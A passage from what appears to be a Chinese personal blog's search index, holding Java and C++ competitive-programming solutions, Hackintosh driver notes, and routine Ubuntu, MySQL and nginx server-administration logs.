i=1;i&amp;lt;=n;i++) out.print(a[i]+(i&amp;lt;n?&amp;quot; &amp;quot;:&amp;quot;&amp;quot;)); out.println(); } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); // tr=new BIT(5);// out.print(tr.lowbit(2)); while(T--&amp;gt;0){ int n=in.nextInt(); a=new int[n+1]; f=new int[n+1]; tr=new BIT(n); for(int i=1;i&amp;lt;=n;i++){ f[i]=in.nextInt(); tr.add(i, 1); } for(int i=n;i&amp;gt;=1;i--){ f[i]-=f[i-1]; int tmp=tr.find(i-f[i]-1); // out.println(i+&quot;,&quot;+f[i]+&quot;,&quot;+tmp); a[i]=tmp; tr.add(tmp, -1); } print(a, out); } out.flush(); out.close(); }}class BIT{ int[] data; int sz; BIT(){} BIT(int _sz){ sz=_sz; data=new int[sz+1]; } int lowbit(int x){ return x&amp;amp;(-x); } void add(int p,int v){ while(p&amp;lt;=sz){ data[p]+=v; p+=lowbit(p); } } int sum(int p){ int res=0; while(p&amp;gt;0){ res+=data[p]; p-=lowbit(p); } return res; } int find(int p){ int l=1,r=sz; while(l&amp;lt;r){ int mid=(l+r)&amp;gt;&amp;gt;1; if (sum(mid)&amp;lt;=p) l=mid+1; else r=mid; } return l; }}[/code] 线段树：[code lang=”java”]/** Dec 6, 2015 4:42:31 PM PrjName: 1205-03-3 @semprathlon/import java.io.;import java.util.*;public class Main { static int[] a,f; static ST tr; static HashSet&lt;Integer&gt; st=new HashSet&lt;Integer&gt;(); static void print(int[] a,PrintWriter out){ int n=a.length-1; for(int i=1;i&amp;lt;=n;i++) out.print(a[i]+(i&amp;lt;n?&amp;quot; &amp;quot;:&amp;quot;&amp;quot;)); out.println(); } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); a=new int[n+1]; f=new int[n+1]; tr=new ST(n); tr.build(1, 1, n); for(int i=1;i&amp;lt;=n;i++) f[i]=in.nextInt(); for(int i=n;i&amp;gt;=1;i--){ f[i]-=f[i-1]; int tmp=tr.query(1, 1, n, f[i]+1); // out.println(i+&quot;,&quot;+f[i]+&quot;,&quot;+tmp); a[i]=tmp; } print(a, out); } out.flush(); out.close(); }}class ST{ int[] l,r,m,v; int sz; ST(){} ST(int _sz){ sz=_sz&amp;lt;&amp;lt;2; l=new int[sz]; r=new int[sz]; m=new int[sz]; v=new int[sz]; } void build(int k,int x,int y){ l[k]=x;r[k]=y;m[k]=(x+y)&amp;gt;&amp;gt;1; if (x&amp;lt;y){ build(k&amp;lt;&amp;lt;1,x,m[k]); build(k&amp;lt;&amp;lt;1|1,m[k]+1,y); } v[k]=y-x+1; } int query(int k,int x,int y,int q){ if (l[k]==r[k]){ v[k]=0; return l[k]; } int res=0; if (v[k&amp;lt;&amp;lt;1|1]&amp;gt;=q) res=query(k&amp;lt;&amp;lt;1|1, m[k]+1, y, q); else res=query(k&amp;lt;&amp;lt;1,x,m[k],q-v[k&amp;lt;&amp;lt;1|1]); v[k]=v[k&amp;lt;&amp;lt;1]+v[k&amp;lt;&amp;lt;1|1]; return res; } }[/code]","link":"/posts/561c3d53/"},{"title":"二分查找中的死循环","text":"编写适应多变需求的二分查找代码。","link":"/posts/c1ea0a82/"},{"title":"黑苹果OS X 10 11 2 驱动基本成功：无休止地挂载、重启换来的回报","text":"此前通过折腾OSX10.9获得了一份较可靠的DSDT代码，但是在装10.11期间试过HP Install Helpler所增补的一些不知其所以然的补丁。两个版本各有优劣，互不相容。 僵持了一个多月后，最终决定手动模拟“二分查找”来对两份代码进行merge操作。 DiffMerge.app是一款直观便捷的文本比较器（不是编辑器）。 经查，防止Clover引导El Captain分区引导失败和排除关机不断电故障的关键代码如下： OperationRegion (GNVS, SystemMemory, 0xAC5EEB98, 0x019F) 在搜索解答的过程中还发现了有用的资料库：Clover Wiki。 为调试DSDT代码，不辞辛劳地降级、升级，方才发现OSX不同版本驱动USB的方式有明显差别。 pcbeta论坛上某坛友仿冒的AppleHDA.kext虽有扬声器音量控制不同步的bug，但总体上异常完善，填补了该领域的一大空白，且能“向上”兼容。 2015年12月勤奋刻苦的国外开发者RehabMan所编写的GenericUSBXHCI.kext成为了驱动USB3.0端口，以及实现USB端口通信正常化的制胜关键。感激不尽。 注意去除DSDT中所注入的USB fakeID之类的值。","link":"/posts/16106ecd/"},{"title":"Speedstep","text":"Speedstep变频的生效，让CPU能耗稳步地下调。","link":"/posts/8e7ef58b/"},{"title":"启用强制https访问","text":"为了从http跳转到https网址，在本站点根目录的.htaccess中增加一条转向规则：RewriteCond %{SERVER_PORT} ^80$ RewriteRule ^(.*)$ https://%{SERVER_NAME}%{REQUEST_URI} [L,R]位置在RewriteEngine On之后。 参考资料","link":"/posts/e3485b0f/"},{"title":"Updated to Wordpress 4 4 1","text":"升级到了WP 4.4.1。【波澜不惊地 升级后管理页面不能正常显示，仅有错误信息：Fatal error: Allowed memory size of 41943040 bytes exhausted (tried to allocate.... bytes) 查阅官方文档后得知，需修改/wp-includes/default-constants.php中'WP_MEMORY_LIMIT'变量的值，扩大WP可分配的内存空间。","link":"/posts/c3ce9fdb/"},{"title":"My Artworks","text":"","link":"/posts/c042700d/"},{"title":"程序设计校赛办完了……","text":"努力赶完了各种超乎预料的活。 命题写标程吃力；惊讶于自己写标程时的乏力，低级算法竟事倍功半。编数据时用py写了生成器（可据此认为是真正地学到了一些Python）但是，小数转分数的输出数据的错误，直到比赛进行中才发现。 判题系统比起之前在云服务器上的糟糕透顶的测试情况，是令人欣慰的。但是在不同机器上运行同一份代码，竟会有不同的结果；还有错综复杂的Compilation Error。自动更新榜单的功能是良好的，但不接受中文（无论UTF-8还是ANSI/GB2312编码）的Display Name的特性是恶劣的。注意性能瓶颈，服务器尽量少承担任务。 网页开发事到临头方才探索动态页面开发、后端数据处理，是折磨的。榜单页面的样式并没有时间完成，不直观，不堪入目。打印页面（此处有预览）终于还是稳定运行了，尽管交互性能极其有限。","link":"/posts/69b3efb5/"},{"title":"【160113】PrintService开发记录","text":"第一次发日志，就从【应用过PrintService的】校赛以后说起吧；不折腾不舒服。 添加动态日期与时间起初，只是通过当前页面的php语句+js去现实时间。尽管努力尝试setInterval与’setTimeout’,但都没能让时间显示“走”起来。后来观看了别人的开发视频，才换成了调用独立的php文件去获取时间。 从Mac系统中获得字体文件参见：Mac OS X: Font locations and their purposes CSS中针对不同字符类型添加字体参考了：利用 CSS 分別設定中文字、英數、注音、假名的字體：使用 CSS3 @font-face CSS中正确处理字体格式刚添加Helvetica字体时，Chrome中返回错误Failed to decode downloaded font，Firefox中返回错误downloadable font: rejected by sanitizer.一方面，Mac系统中常见的ttc与dfont格式字体文件（collection，单个文件实际可包含多种字体）不被支持，需要被转换。另一方面，CSS中引用字体文件时需指明格式。有CSS @font-face syntax. 库容广大的字体库","link":"/posts/fe6e6fab/"},{"title":"【160118】服务器管理记录","text":"更换系统再也无法忍受Windows 2008 Server x86，将其逐出门外为快。 ssh初步 ssh [username]@[IP Address] scp [filename] [username]@[IP Address]:[directory] apache,mysql,php部署 设置默认访问【？】页面如图所示，将index.php提前，那么访问该目录时将优先转向此页面。 unzip","link":"/posts/bccfa7f7/"},{"title":"【160123】服务器管理记录","text":"Ubuntu Server用户管理 List all cut -d: -f1 /etc/passwd Create sudo useradd [username]sudo passwd [username] Delete sudo userdel [username]sudo rm -rf /home/[username] List UIDs awk -F: ‘/\\/home/ {printf “%s:%s\\n”,$1,$3}’ /etc/passwd 使用vsftpd搭建ftp服务 Install sudo apt-get updatesudo apt-get install vsftpd Configure sudo nano /etc/vsftpd.conf Disallow anonymous, unidentified users to access files via FTP; change the anonymous_enable setting to NO: anonymous_enable=NO Disallow anonymous, unidentified users to access files via FTP; change the anonymous_enable setting toAllow local uses to login by changing the local_enable setting to YES: local_enable=YES If you want local user to be able to write to a directory, then change the write_enable setting to YES: write_enable=YES Solve 530 Login incorrect: pam_service_name=ftp Solve 550 failed to change directory chroot_local_user=NO Run sudo service vsftpd restart[/start/stop] Wordpress快速搭建 Look through readme.html and go for it,but something in wp-config.php should be edited to optimize. change language from English to Chinese / To be added somewhere appropriate /define(‘WPLANG’, ‘zh_CN’); download smoothly without a fuzzy FTP config (resolve the trouble caused by authority) chmod -R 755 [wordpress-directory]chown -R www-data [wordpress-directory]","link":"/posts/577e6feb/"},{"title":"BestCoder","text":"Solved Problems Baby Ming and Weight lifting Baby Ming and phone number Baby Ming and Matrix games Baby Ming and Weight lifting如果a与b发生了交换，那么对应的个数也要交换。避免自己坑自己。[code lang=”java”]import java.io.;import java.util.;public class Main { static String err=&quot;Impossible&quot;; public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T–&gt;0){ int a=in.nextInt(); int b=in.nextInt(); int c=in.nextInt(); if (a==b){ out.println(err); continue; } else{ boolean tmp=false; if (a&gt;b){ int t=a;a=b;b=t;tmp=true; } int ans=0x6fffffff,sa=0,sb=0; for(int i=0;i&lt;=c/b;i+=2) if ((c-ib)%a==0&amp;&amp;(c-ib)/a%2==0){ sb=i;sa=(c-ib)/a; ans=Math.min(ans, ib+(c-i*b)/a); } if (ans&lt;0x6fffffff){ if (tmp){ int t=sa;sa=sb;sb=t; } out.println(sa+&quot; &quot;+sb); } else out.println(err); } } out.flush(); out.close(); }}[/code] Baby Ming and phone number当时遗漏了条件2中“公差为1”的限制，浪费了一次提交。[code lang=”java”]/** Jan 23, 2016 7:46:40 PM PrjName: Bc69-02 @semprathlon/import java.io.;import java.util.*;public class Main { static int[] mon=new int[]{31,28,31,30,31,30,31,31,30,31,30,31}; static boolean IsnotLeap(int y){ return y%4==0&amp;amp;&amp;amp;y%100!=0||y%400==0; } static int days(int y,int m){ if (m==2&amp;amp;&amp;amp;IsnotLeap(y)) return 29; else if (m==2&amp;amp;&amp;amp;!IsnotLeap(y)) return 28; else return mon[m-1]; } static boolean check1(String s){ for(int i=7;i&amp;lt;10;i++){ if ((s.charAt(i)&amp;lt;&amp;lt;1)!=s.charAt(i-1)+s.charAt(i+1)||Math.abs(s.charAt(i-1)-s.charAt(i))&amp;gt;1||Math.abs(s.charAt(i+1)-s.charAt(i))&amp;gt;1) return false; } return true; } static boolean checkd1(int y,int m,int d){ return y&amp;gt;=1980&amp;amp;&amp;amp;y&amp;lt;=2016&amp;amp;&amp;amp;m&amp;gt;=1&amp;amp;&amp;amp;m&amp;lt;=12&amp;amp;&amp;amp;d&amp;gt;=1&amp;amp;&amp;amp;d&amp;lt;=days(y,m); } static boolean check2(String s){ int y=Integer.parseInt(s.substring(3, 7)); int m=Integer.parseInt(s.substring(7, 9)); int d=Integer.parseInt(s.substring(9, 11)); return checkd1(y,m,d); } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ int n=in.nextInt(); long a=in.nextLong(); long b=in.nextLong(); long ans=0; for(int i=1;i&amp;lt;=n;i++){ String s=in.next(); if (check1(s)||check2(s)) ans+=a; else ans+=b; } out.println(ans); } out.flush(); out.close(); }}[/code] Baby Ming and Matrix gamesz==sum*m而不是z/m==sum，功亏一篑啊！[code lang=”java”]/** Jan 23, 2016 8:06:17 PM PrjName: Bc69-03 @semprathlon/import java.io.;import java.util.*;public class Main { static int[][] dir={ {0,1},{0,-1},{-1,0},{1,0}}; static char[][] g; static int n,m; static long sum; static boolean[][] vis; static Vector&lt;Character&gt; vec=new Vector&lt;Character&gt;(); static void print(Vector&lt;Character&gt; v,PrintWriter out){ for(int i=0;i&amp;lt;v.size();i++) out.print(v.get(i)+&amp;quot;,&amp;quot;); out.println(); } static boolean calc(Vector&lt;Character&gt; v){ long z=v.get(0)-&apos;0&apos;,m=1; for(int i=1;i&amp;lt;v.size()-1;i+=2){ switch (v.get(i)) { case &apos;+&apos;: z+=(v.get(i+1)-&apos;0&apos;)*m; break; case &apos;-&apos;: z-=(v.get(i+1)-&apos;0&apos;)*m; break; case &apos;*&apos;: z*=v.get(i+1)-&apos;0&apos;; break; case &apos;/&apos;: m*=v.get(i+1)-&apos;0&apos;; break; } } if (m==0) return false; else return z==sum*m; } static boolean can(int x,int y){ return x&amp;gt;=0&amp;amp;&amp;amp;x&amp;lt;n&amp;amp;&amp;amp;y&amp;gt;=0&amp;amp;&amp;amp;y&amp;lt;m; } static boolean dfs(Vector&lt;Character&gt; v,int x,int y,PrintWriter out){ v.add(g[x][y]); boolean has=false,res=calc(v); for(int k=0;k&amp;lt;4;k++) if (!res){ int dx=x+dir[k][0]*2; int dy=y+dir[k][1]*2; if (can(dx,dy)&amp;amp;&amp;amp;!vis[dx][dy]){ has=true; vis[dx][dy]=true; v.add(g[(x+dx)&amp;gt;&amp;gt;1][(y+dy)&amp;gt;&amp;gt;1]); res|=dfs(v,dx,dy,out); v.remove(v.size()-1); vis[dx][dy]=false; } } if (!has){ res|=calc(v); v.remove(v.size()-1); return res; } v.remove(v.size()-1); return res; } static boolean solve(PrintWriter out){ vis=new boolean[n][m]; for(int i=0;i&amp;lt;n;i+=2) for(int j=0;j&amp;lt;m;j+=2){ vec.clear(); vis[i][j]=true; if (dfs(vec,i,j,out)) return true; vis[i][j]=false; } return false; } public static void main(String[] args) throws IOException{ InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); while(T--&amp;gt;0){ n=in.nextInt(); m=in.nextInt(); sum=in.nextLong(); g=new char[n][m]; for(int i=0;i&amp;lt;n;i++){ String s=in.next(); for(int j=0;j&amp;lt;m;j++) g[i][j]=s.charAt(j); } out.println(solve(out)?&amp;quot;Possible&amp;quot;:&amp;quot;Impossible&amp;quot;); } out.flush(); out.close(); }}[/code]","link":"/posts/561c3d53/"},{"title":"【160124】服务器管理记录","text":"Ubuntu 解决语言设置错误的问题，并正常输入输出中文 安装localepurge管理语言文件 sudo apt-get install localepurge 当然也可以使用以下命令再次进行配置： sudo dpkg-reconfigure localepurg 在本地对fish-shell进行配置： set -U LANG en_US.UTF-8set -U LC_ALL en_US.UTF-8 Apache: Set Up Mod_Rewrite sudo a2enmod rewrite My\u0010SQL user management enter interactive mode mysql -u [username] -h [hostname] -p show all users select * {host,user,…} from mysql.user add a user create user [username]@[hostname] identified by ‘[password]’ delete a user drop user [username]@[hostname] give privileges (users not existed will be created) grant {all privileges,select,usage,…} on *.* to [username]@[hostname] identified ‘[password]’ retrieve privileges revoke {all privileges,select,usage,…} on *.* from [username]@[hostname] identified ‘[password]’ show privileges show grants for [username]@[hostname]; All sorts of privileges","link":"/posts/992e9343/"},{"title":"【160126】服务器管理记录","text":"Add sudoers whereis sudoerschmod u+w /etc/sudoerssudo nano /etc/sudoerschmod u-w /etc/sudoers Nginx installing Download sudo apt-get install nginxsudo apt-get install php5-cli php5-cgi mysql-server php5-mysqlsudo apt-get install php5-fpm Edit profile sudo nano /etc/nginx/sites-available/default ` root /var/www/html; index index.php index.html index.htm; location ~ .php$ { include /etc/nginx/fastcgi_params; #需放在第一行，否则会出错 fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/nginx-default$fastcgi_script_name; } ` Run sudo spawn-fcgi -a 127.0.0.1 -p 9000 -C 10 -u www-data -f /usr/bin/php-cgi/etc/init.d/nginx start","link":"/posts/948b51e/"},{"title":"黑苹果开机慢的解决","text":"黑苹果开机慢的解决 process launchctl[2] thread 242 caught burning CPU! It used more than 50% CPU… Uninstalling the current Wacom drivers (6.3.15-1) and installing the previous version (6.3.11-3a)","link":"/posts/ecb9411d/"},{"title":"我为什么选择了网易云音乐而不是百度音乐","text":"","link":"/posts/1b96b500/"},{"title":"本站已启用“多说”评论框","text":"“多说”评论框刚刚启用了。。。方才配置过程中有些设置项目总加载不出，然后发现Chrome拦截了不安全的脚本。。。接着是部分css样式没有即时显示，是cache的锅。。。","link":"/posts/ca15e0ba/"},{"title":"目前最为清洁的OS X 10 11 3系统安装","text":"结合之前折腾出的整套Clover配置，将驱动贴合度提升到了新的高度。启动后的登录界面不能平滑出现，不知是图形驱动不完善或者是特性被取消了。不过，其他平滑特效仍然存在，借助Rehabman开发的ACPIBacklight.kext及其配套的DSDT补丁。Clover GUI的扁苹果、载入界面的扁苹果还是无法解决。6-series的主板BIOS里找不到CSM相关选项？至于Wacom驱动，更新到6.3.15-3版以后就没问题了。","link":"/posts/300fb409/"},{"title":"The 1st anniversary of this WordPress blog!","text":"As can be seen from the 1st post, a magnificant year has passed along with abundant memories and dialogues at this site.Up till now,there have been 178 articles published.","link":"/posts/f3aba875/"},{"title":"黑苹果折腾第三迭代之末","text":"通过不断调换SSDT存档，得出调查结论：不同于以往的OS X 10.9，现在无论是BIOS还是DSDT或是SSDT屏蔽独显，都会导致核显工作不正常（闪烁、花屏乃至死机）。独显虽无法参与工作，但也未必是个累赘。反倒是**sensors.kext系列让机器温度偏高。睡眠、唤醒顺利，但是蓝牙还是容易停止工作。USB3.0能轻松驱动。","link":"/posts/2a7b1923/"},{"title":"【160221】服务器管理记录","text":"MySQL:show columns of a certain datatable: show full columns from [tablename]; Nginx:remove root directory root /usr/share/nginx/html;…location / {…fastcgi_param SCRIPT_FILENAME /usr/share/nginx/html$fastcgi_script_name;…} /etc/init.d/nginx restart Nginx:add rewrite rules for redirecting,map port 8080 into 80. server { listen 8080; server\\_name localhost\\_redirect; rewrite ^/(.+)/.\\* /$1 last; location / \\{ proxy\\_pass http://127.0.0.1:80; proxy\\_set\\_header Host $host:80; proxy\\_set\\_header X-Real-IP $remote\\_addr; proxy\\_set\\_header X-Forwarded-For $proxy\\_add\\_x\\_forwarded\\_for; \\} }","link":"/posts/748c6475/"},{"title":"针对js,jquery中的this对象的理解","text":"详解js和jquery里的this关键字","link":"/posts/6ff198/"},{"title":"【160226】服务器管理记录","text":"Test nginx.conf /usr/sbin/nginx -t Duplicate a MySQL database with its tables mysqldump [existing database] -u root -p’[password]’ –add-drop-table | mysql [new database] -u root -p’[password]’ Check the direction of MySQL data files show variables like ‘%dir%’; Uninstall and reinstall node &amp; npm sudo apt-get updatesudo apt-get install nodejssudo apt-get install npm","link":"/posts/badc98dd/"},{"title":"【非真实】午后静思：量子信息传递，时空穿越？","text":"今天午休时回忆起了《星际穿越》的震撼情节，产生了一些遐想。 量子通信具有无限辽阔的前景？通过发挥我的主观能动性对过去做出一些改变？ 在我高中时期异彩纷呈的种种兴趣爱好中，密码学占有一个旮旯。那之前就对摩尔斯电码略有一点知晓。甚至有一次从网上摘抄了摩尔斯密码对照表，继而在学校里的通用技术等“闲课”（高二）上鼓捣编解码。我也长期拥有手表，甚至一块从高二一直使用到现在（大二）的机械手表。以上是否会构成秘密通信的渠道？ 高二是高中五大学科竞赛全线开战的一年。高三是自主招生、三位一体招生在接上高考的轮番作战的一年。我一如既往地凭借“女生的专长”——记忆和归纳能力勇往直前，却没能摆脱本属于“男生的优势”的推理和演绎能力的顽固缺陷。化学生物进展顺利，数学物理一筹莫展。这种格局一直延续到临近高考时仍难以改观。 加入数学、物理竞赛是无所畏惧的探险，然而甚至得不到一个普通的结果。我意欲以当前的雄厚经验累积，向当年出征前的自己发出信号：数理应由攻转防，腾出宝贵的生产力强化优势方向，还要稳固动荡的根基。（至少现在看来）高三中后期的颓势都可逆转，进入985高校就真的不是空话。 不过以上并不能提供消极回避现实的机会。毕竟也要做好准备，在急求向过去发送讯息的同时，接收未来传回的关键情报。","link":"/posts/e9d9f/"},{"title":"Microsoft Surface 3","text":"","link":"/posts/4b148e9a/"},{"title":"【160324】服务器管理记录","text":"Run an existing MySQL-dump script source [filename] switch Ubuntu mirror source (take an eye on the version) sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup(editing /etc/apt/sources.list)sudo apt-get updatesudo apt-get upgrade http://askubuntu.com/questions/645236/command-to-list-all-users-with-their-uid","link":"/posts/4436a5c1/"},{"title":"茶壶里煮饺子——肚里有货，嘴里倒不出","text":"","link":"/posts/3e06d992/"},{"title":"Mathjax改造","text":"Mathjax for WordPress插件的开发者认为，$...$标签可能与$货币符号混淆，故用$latex标记公式。 为了通用性和简洁性，我通过插件改造把$latex改回了$，但又兼容已经书写过公式的既有文章。 主要改动是\\$latex[= ](.*?[^\\\\\\\\])\\$改为\\$(latex){0,1}[= ](.*?[^\\\\\\\\])\\$。 $latex a^2 $$ a^2 $","link":"/posts/fe56f45/"},{"title":"在Eclipse中查看jdk源代码","text":"为了帮助初学Java的同学，现给出查看jdk源代码的提示： 相关文件为$JAVA_HOME$/src.zip","link":"/posts/f92c5a60/"},{"title":"ACM竞赛专题 高质量文摘","text":"埃氏筛法、欧拉筛法、积性函数线性筛与莫比乌斯反演 各种字符串Hash函数比较","link":"/posts/3fc7d16c/"},{"title":"hdu 3333 Turing Tree","text":"Turing TreeTime Limit: 6000/3000 MS (Java/Others)Memory Limit: 32768/32768 K (Java/Others) Problem Description After inventing Turing Tree, 3xian always felt boring when solving problems about intervals, because Turing Tree could easily have the solution. As well, wily 3xian made lots of new problems about intervals. So, today, this sick thing happens again… Now given a sequence of N numbers A1, A2, …, AN and a number of Queries(i, j) (1≤i≤j≤N). For each Query(i, j), you are to caculate the sum of distinct values in the subsequence Ai, Ai+1, …, Aj. Input The first line is an integer T (1 ≤ T ≤ 10), indecating the number of testcases below.For each case, the input format will be like this: Line 1: N (1 ≤ N ≤ 30,000). Line 2: N integers A1, A2, …, AN (0 ≤ Ai ≤ 1,000,000,000). Line 3: Q (1 ≤ Q ≤ 100,000), the number of Queries. Next Q lines: each line contains 2 integers i, j representing a Query (1 ≤ i ≤ j ≤ N). Output For each Query, print the sum of distinct values of the specified subsequence in one line. Sample Input 231 1 421 22 351 1 2 1 331 52 43 5 Sample Output 15636 Author 3xian@GDUT 离线化 从左到右处理原数列 对询问排序 不再是难题。 /* * File: main.cpp * Author: semprathlon * * Created on March 25, 2016, 4:02 PM */ #include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;cstdlib&gt; #include &lt;cmath&gt; #include &lt;map&gt; #include &lt;vector&gt; #include &lt;algorithm&gt; using namespace std; typedef long long ll; const int maxn = 100010; struct SegTree { int l, r, m; ll val; SegTree *L, *R; SegTree() {} SegTree(int x, int y) { this-&gt;build(x, y); } ~SegTree(){ if (this-&gt;L!=NULL) free(this-&gt;L); if (this-&gt;R!=NULL) free(this-&gt;R); } void build(int x, int y) { int mi = (x + y) &gt;&gt; 1; l = x;r = y;m = mi;val = 0; if (x &lt; y) { L = new SegTree(x, m); R = new SegTree(m + 1, y); } } inline void up(){ val=L-&gt;val+R-&gt;val; } void add(int x, int v) { if (l == r) { val += v; return; } if (x &lt;= m) L-&gt;add(x, v); else if (x &gt; m) R-&gt;add(x, v); up(); } ll query(int x, int y) { if (x &lt;= l &amp;&amp; r &lt;= y) { return val; } ll res = 0; if (x &lt;= m) res += L-&gt;query(x, y); if (y &gt; m) res += R-&gt;query(x, y); return res; } } *ST; struct Inv { int l, r, id; Inv() {}; Inv(int _l, int _r, int _id) : l(_l), r(_r), id(_id) {}; }; inline bool operator&lt;(const Inv&amp; a, const Inv&amp; b) { return a.r &lt; b.r; } int a[maxn]; ll ans[maxn]; vector&lt;Inv&gt; v; vector&lt;Inv&gt;::iterator it; map&lt;int, int&gt; mp; int main() { int T; scanf(\"%d\", &amp;T); while (T--) { int n, q; scanf(\"%d\", &amp;n); for (int i = 1; i &lt;= n; i++) scanf(\"%d\", &amp;a[i]); v.clear(); scanf(\"%d\", &amp;q); for (int i = 0; i &lt; q; i++) { int x, y; scanf(\"%d%d\", &amp;x, &amp;y); v.push_back(Inv(x, y, i)); } sort(v.begin(), v.end()); it = v.begin(); ST = new SegTree(1, n); fill(ans, ans + q, 0); mp.clear(); for (int i = 1; i &lt;= n; i++) { if (mp.find(a[i])!=mp.end()){ ST-&gt;add(mp[a[i]], -a[i]); } mp[a[i]]=i; ST-&gt;add(i, a[i]); for (; it != v.end() &amp;&amp; it-&gt;r == i; it++) ans[it-&gt;id] = ST-&gt;query(it-&gt;l, it-&gt;r); } for (int i = 0; i &lt; q; i++) printf(\"%I64d\\n\", ans[i]); free(ST); } return 0; }","link":"/posts/bce7557f/"},{"title":"BestCoder","text":"已解决题目列表 Rikka with Chess Rikka with Graph Rikka with Chess不要看到“矩形”就想得太远。基本的方法就是隔行隔行地把同化列的颜色，再隔列隔列地变换。只需n/2+m/2. Rikka with Graph易知使图连通的最少边数是n-1，边数少于n-1时肯定不连通，那么n+1条边之中最多去掉2条还能保持连通。枚举所有去掉1条边或2条边的情况即可。适当注意一下并查集操作的写法就能防止超时。 /* * File: main.cpp * Author: semprathlon * * Created on February 21, 2016, 4:14 PM */ #include &lt;iostream> #include &lt;cstdio> #include &lt;cstdlib> using namespace std; typedef long long LL; const int maxn = 220; int u[maxn], v[maxn], f[maxn]; int n; void init() { for (int i = 1; i &lt;= n; i++) f[i] = i; } int getf(int x) { if (f[x] == x) return x; else return f[x] = getf(f[x]); } bool unite(int x, int y) { int a = getf(x), b = getf(y); if (f[a] == b || f[b] == a) return false; if (f[b] == b) f[b] = a; else f[a] = b; return true; } bool check(int id1, int id2) { int cnt = n; for (int i = 0; i &lt;= n; i++) { if (i == id1 || i == id2) continue; if (unite(u[i], v[i])) cnt--; } return cnt == 1; } int main() { int T; scanf(\"%d\", &T); while (T--) { scanf(\"%d\", &n); for (int i = 0; i &lt;= n; i++) { scanf(\"%d%d\", &u[i], &v[i]); } LL ans = 0; for (int i = 0; i &lt;= n; i++) { init(); if (check(-1, i)) ans++; for (int j = i + 1; j &lt;= n; j++) { init(); if (check(i, j)) ans++; } } printf(\"%I64d\\n\", ans); } return 0; } }","link":"/posts/561c3d53/"},{"title":"BestCoder","text":"已解决题目列表 Jam’s math problem Jam’s balance Jam’s maze Jam’s math problem刚开始想到了$latex \\Delta$，其实不是一回事。直接枚举就行了。 /** * Feb 13, 2016 4:54:02 PM * PrjName: hdu5615 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static boolean check(int a, int b, int c, int p, int k) { int q = a / p; int m = c / k; return q * k + m * p == b; } public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- > 0) { int a = in.nextInt(); int b = in.nextInt(); int c = in.nextInt(); int mp = (int) Math.sqrt(a); int mk = (int) Math.sqrt(c); boolean ans = false; for (int p = 1; p &lt;= mp; p++) { if (a % p > 0) continue; if (ans) break; for (int k = 1; k &lt;= mk; k++) { if (c % k > 0) continue; if (check(a, b, c, p, k) || check(a, b, c, a / p, k) || check(a, b, c, p, c / k) || check(a, b, c, a / p, c / k)) { ans = true; break; } } } out.println(ans ? \"YES\" : \"NO\"); } out.flush(); out.close(); } } Jam’s balance最初的想法是将砝码分成两堆（天平左右各一堆），位操作模拟集合，枚举所有可得到的重量。于是就错了，因为并非所有砝码都要放到天平上。若尝试枚举分成三堆的所有情况，就超时了。 做着做着又有了个基于集合操作的想法，先只做“加”不做“减”，保存所有情况于集合中；再从集合中任取两个做“减法”并把差也放入集合。接着又觉得“减法”中可能会出现一个砝码同时被“放置”在天平两端点情况。经过几次动摇之后，否定了此疑问，最终确定了正确的思路。 /** * Feb 13, 2016 5:03:08 PM * PrjName: hdu5616 * @semprathlon */ import java.io.*; import java.util.*; public class Main { static int[] w; static Set st = new Set(); static Set tmp; static boolean has(int q, int v) { return st.contains(q + v) || st.contains(q - v); } public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- > 0) { int n = in.nextInt(); int sw = 0; w = new int[n]; for (int i = 0; i &lt; n; i++) w[i] = in.nextInt(); st.clear(); st.add(0); for (int i = 0; i &lt; n; i++) sw += w[i]; for (int i = 0; i &lt; (1 &lt;&lt; (n - 1)); i++) { int v1 = 0; for (int k = 0; k &lt; n; k++) if (((1 &lt;&lt; k) & i) > 0) v1 += w[k]; st.add(v1); st.add(sw - v1); } tmp = new Set(); for (int i = 0; i &lt; st.vec.size() - 1; i++, tmp.add(st.vec.get(i))) for (int j = i + 1; j &lt; st.vec.size(); j++) tmp.add(Math.abs(st.vec.get(i) - st.vec.get(j))); st = tmp; int m = in.nextInt(); while (m-- > 0) { int q = in.nextInt(); out.println(st.contains(q) ? \"YES\" : \"NO\"); } } out.flush(); out.close(); } } class Set { final int maxn = 2010; BitSet set; Vector&lt;Integer> vec; Set() { set = new BitSet(maxn); vec = new Vector&lt;Integer>(); } void clear() { set.clear(); vec.clear(); } void add(int v) { if (v &lt; 0 || v >= maxn) return; if (!this.contains(v)) { set.set(v); vec.add(v); } } boolean contains(int v) { if (v &lt; 0 || v >= maxn) return false; return set.get(v); } } 后来看了原版题解，发现可以用背包做： /** * Feb 16, 2016 1:24:36 PM * PrjName: hdu5616-2 * @semprathlon */ import java.io.*; import java.util.*; public class Main { final static int maxn = 2010; static int[] w, f; public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(System.out); int T = in.nextInt(); while (T-- > 0) { int n = in.nextInt(); int sw = 0; w = new int[n]; f = new int[maxn]; f[0] = 1; for (int i = 0; i &lt; n; i++) w[i] = in.nextInt(); for (int i = 0; i &lt; n; i++) for (int j = maxn - 1; j >= w[i]; j--) if (f[j - w[i]] > 0) f[j]++; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; maxn - w[i]; j++) if (f[j + w[i]] > 0) f[j]++; int m = in.nextInt(); while (m-- > 0) { int q = in.nextInt(); out.println(f[q] > 0 ? \"YES\" : \"NO\"); } } 